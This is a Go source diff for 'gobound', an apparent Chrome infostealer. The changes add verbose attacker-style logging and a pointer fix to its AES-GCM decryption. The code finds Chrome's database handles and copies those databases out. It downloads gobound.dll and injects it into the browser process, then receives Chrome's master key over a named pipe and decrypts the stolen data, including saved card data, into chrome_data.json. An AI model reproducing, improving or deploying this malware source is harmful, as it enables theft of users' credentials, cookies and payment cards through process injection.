@@ -5,6 +5,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"log"
 	"strings"
 	"syscall"
 	"time"
@@ -242,13 +243,17 @@ func createPipeServer() uintptr {
 }
 
 func Extract() (*ExtractionResult, error) {
+	log.Println("[*] starting extraction process...")
 	config := &ExtractionResult{}
 	var extractedFiles []RawFile
 
+	log.Println("[*] scanning for chrome.exe processes...")
 	chromeProcs, err := ScanProcesses("chrome.exe")
 	if err != nil {
+		log.Printf("[-] failed to scan processes: %v\n", err)
 		return nil, fmt.Errorf("scan processes: %w", err)
 	}
+	log.Printf("[+] found %d chrome processes\n", len(chromeProcs))
 
 	var targetPID uint32
 	var foundHandles = make([]struct {
@@ -258,6 +263,7 @@ func Extract() (*ExtractionResult, error) {
 		dbType string
 	}, 0)
 
+	log.Println("[*] searching for relevant database handles...")
 	for pid, handles := range chromeProcs {
 		for _, h := range handles {
 			type extractResult struct {
@@ -297,6 +303,7 @@ func Extract() (*ExtractionResult, error) {
 			}
 
 			if dbType != "" {
+				log.Printf("[+] found %s handle in PID %d: %s\n", dbType, pid, path)
 				foundHandles = append(foundHandles, struct {
 					handle uintptr
 					pid    uint32
@@ -311,6 +318,7 @@ func Extract() (*ExtractionResult, error) {
 	}
 
 	if len(foundHandles) == 0 {
+		log.Println("[-] no chrome process found with required DB handles")
 		return nil, fmt.Errorf("no chrome process found with required DB handles")
 	}
 
@@ -323,10 +331,13 @@ func Extract() (*ExtractionResult, error) {
 		}
 	}
 	targetPID = mainBrowserPID
+	log.Printf("[*] selected main browser PID: %d\n", targetPID)
 
+	log.Println("[*] extracting database files...")
 	for i, info := range foundHandles {
 		data, _, err := ExtractFile(info.handle, info.pid)
 		if err != nil {
+			log.Printf("[-] Failed to extract file from handle %x in PID %d: %v\n", info.handle, info.pid, err)
 			continue
 		}
 
@@ -335,6 +346,7 @@ func Extract() (*ExtractionResult, error) {
 		safeType := strings.ReplaceAll(info.dbType, " ", "_")
 		filename := fmt.Sprintf("chrome_%s_%d_%d.db", safeType, info.pid, i)
 
+		log.Printf("[+] extracted %s (%d bytes) for profile '%s'\n", filename, len(data), profile)
 		extractedFiles = append(extractedFiles, RawFile{
 			Name:    filename,
 			Data:    data,
@@ -343,13 +355,17 @@ func Extract() (*ExtractionResult, error) {
 	}
 
 	if len(extractedFiles) == 0 {
+		log.Println("[-] failed to extract any database files")
 		return nil, fmt.Errorf("failed to extract any database files")
 	}
 
+	log.Println("[*] creating named pipe server...")
 	hPipe := createPipeServer()
 	if hPipe == invalidHandleValue || hPipe == 0 {
+		log.Println("[-] CreateNamedPipeW failed")
 		return nil, fmt.Errorf("CreateNamedPipeW failed")
 	}
+	log.Println("[+] pipe server created successfully")
 
 	var clientId struct {
 		pid uintptr
@@ -372,6 +388,7 @@ func Extract() (*ExtractionResult, error) {
 
 	if r != statusSuccess {
 		wc.CallG0(closeHandle, hPipe)
+		log.Printf("[-] Failed to open target chrome process: %x\n", r)
 		return nil, fmt.Errorf("failed to open target chrome process: %x", r)
 	}
 
@@ -381,17 +398,25 @@ func Extract() (*ExtractionResult, error) {
 		wc.CallG0(closeHandle, hProcess)
 		return nil, fmt.Errorf("failed to download gobound.dll: %w", err)
 	}
+	log.Printf("[+] downloaded (%d bytes)\n", len(dllBytes))
 
+	log.Println("[*] mapping DLL into chrome...")
 	if err := loader.LoadDLLRemote(hProcess, dllBytes); err != nil {
 		wc.CallG0(closeHandle, hPipe)
 		wc.CallG0(closeHandle, hProcess)
+		log.Printf("[-] failed to inject DLL: %v\n", err)
 		return nil, fmt.Errorf("inject DLL: %w", err)
 	}
+	log.Println("[+] DLL injected")
+
+	log.Println("[*] waiting for DLL to connect to named pipe...")
 	wc.CallG0(connectNamedPipe, hPipe, uintptr(0))
+	log.Println("[+] DLL connected :3")
 
 	var masterKey []byte
 	buf := make([]byte, 4096)
 	msgCount := 0
+	log.Println("[*] reading data from named pipe...")
 	for {
 		var bytesRead uint32
 		ret, _, _ := wc.CallG0(ReadFile,
@@ -414,15 +439,19 @@ func Extract() (*ExtractionResult, error) {
 			msgLen--
 		}
 		msg := string(buf[:msgLen])
+		log.Printf("[*] received message from pipe: %s\n", msg)
 		if strings.HasPrefix(msg, "KEY:") {
 			keyHex := strings.TrimPrefix(msg, "KEY:")
 			masterKey, err = hex.DecodeString(keyHex)
 			if err != nil {
 				wc.CallG0(closeHandle, hPipe)
 				wc.CallG0(closeHandle, hProcess)
+				log.Printf("[-] failed to decode master key: %v\n", err)
 				return nil, fmt.Errorf("decode master key: %w", err)
 			}
+			log.Println("[+] master key received")
 		} else if msg == "DONE" {
+			log.Println("[+] received DONE signal from DLL")
 			break
 		}
 	}
@@ -431,6 +460,7 @@ func Extract() (*ExtractionResult, error) {
 	wc.CallG0(closeHandle, hProcess)
 
 	if len(masterKey) == 0 {
+		log.Println("[-] Failed to retrieve master key from DLL")
 		return nil, fmt.Errorf("failed to retrieve master key from DLL")
 	}
 
@@ -836,32 +866,26 @@ func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
 		CbTag:         uint32(len(tag)),
 	}
 
-	var cbResult uint32
-	ret, _, _ = wc.CallG0(bcryptDecrypt,
-		hKey,
-		uintptr(unsafe.Pointer(&ciphertext[0])),
-		uintptr(len(ciphertext)),
-		uintptr(unsafe.Pointer(&authInfo)),
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-		uintptr(unsafe.Pointer(&cbResult)),
-		uintptr(0),
-	)
-	if ret != 0 {
-		return nil, fmt.Errorf("BCryptDecrypt (size) failed: 0x%x", ret)
+	var ciphertextPtr uintptr
+	if len(ciphertext) > 0 {
+		ciphertextPtr = uintptr(unsafe.Pointer(&ciphertext[0]))
 	}
 
-	plaintext := make([]byte, cbResult)
+	var cbResult uint32
+	var plaintextPtr uintptr
+	plaintext := make([]byte, len(ciphertext))
+	if len(plaintext) > 0 {
+		plaintextPtr = uintptr(unsafe.Pointer(&plaintext[0]))
+	}
+
 	ret, _, _ = wc.CallG0(bcryptDecrypt,
 		hKey,
-		uintptr(unsafe.Pointer(&ciphertext[0])),
+		ciphertextPtr,
 		uintptr(len(ciphertext)),
 		uintptr(unsafe.Pointer(&authInfo)),
 		uintptr(0),
 		uintptr(0),
-		uintptr(unsafe.Pointer(&plaintext[0])),
+		plaintextPtr,
 		uintptr(len(plaintext)),
 		uintptr(unsafe.Pointer(&cbResult)),
 		uintptr(0),
@@ -1038,15 +1062,20 @@ func extractCardsFromBytes(masterKey []byte, data []byte, profile string) []Card
 }
 
 func main() {
+	log.Println("[*] starting gobound...")
 	result, err := Extract()
 	if err != nil {
+		log.Printf("[-] extraction failed: %v\n", err)
 		return
 	}
 
+	log.Println("[*] marshaling results to JSON...")
 	jsonData, err := json.MarshalIndent(result, "", "  ")
 	if err != nil {
+		log.Printf("[-] failed to marshal JSON: %v\n", err)
 		return
 	}
 
+	log.Println("[*] saving results to chrome_data.json...")
 	SaveFile(jsonData, "chrome_data.json")
 }
